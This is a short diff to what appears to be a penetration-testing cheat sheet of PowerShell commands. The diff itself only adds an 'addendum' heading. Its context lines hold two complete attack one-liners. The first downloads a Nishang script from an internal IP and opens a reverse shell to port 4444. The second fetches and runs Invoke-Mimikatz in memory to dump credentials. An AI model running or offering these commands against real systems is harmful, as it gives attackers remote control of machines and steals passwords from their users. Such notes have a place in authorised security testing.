@@ -46,7 +46,10 @@ Put in `C:\xampp\htdocs`:
 powershell "IEX (New-Object Net.Webclient).downloadstring('http://172.16.152.213/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444"
 ```
 
-Run tools:
+* * * 
+addendum
+
+Run tools directly:
 ```
 iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
 ```
